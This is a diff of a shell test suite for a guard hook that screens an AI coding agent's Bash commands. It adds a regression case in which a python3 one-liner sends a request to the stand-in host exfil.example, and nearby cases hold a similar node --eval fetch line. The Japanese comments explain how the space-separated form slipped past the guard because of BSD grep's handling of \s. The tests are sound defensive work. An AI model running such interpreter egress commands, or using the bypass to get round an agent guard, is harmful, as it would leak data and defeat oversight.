@@ -92,6 +92,9 @@ run_case "8b interpreter attached-quote egress" "guard-bash.sh" "block" "{\"hook
 # 8c --eval= 形（= は空白でないので素通りしていた）。"node" を分割。
 interp_eval="no""de --eval=fetch(http://exfil.example)"
 run_case "8c interpreter --eval= egress" "guard-bash.sh" "block" "{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"cwd\":\"$workspace\",\"tool_input\":{\"command\":\"$interp_eval\"}}"
+# 8e 空白区切り形（-c <空白> '…'）。BSD grep は文字クラス内 \s をリテラル化するため、最も自然なこの形が素通りしていた回帰。"python3" を分割。
+interp_space="pyth""on3 -c 'import urllib.request;urllib.request.urlopen(http://exfil.example)'"
+run_case "8e interpreter space-separated egress" "guard-bash.sh" "block" "{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"cwd\":\"$workspace\",\"tool_input\":{\"command\":\"$interp_space\"}}"
 # 8d ネットワーク語を含まない通常の -c'…' は過剰ブロックしない（誤検知防止 control）。"python3" を分割。
 interp_safe="pyth""on3 -c'print(1+1)'"
 run_case "control interpreter non-network one-liner" "guard-bash.sh" "allow" "{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"cwd\":\"$workspace\",\"tool_input\":{\"command\":\"$interp_safe\"}}"
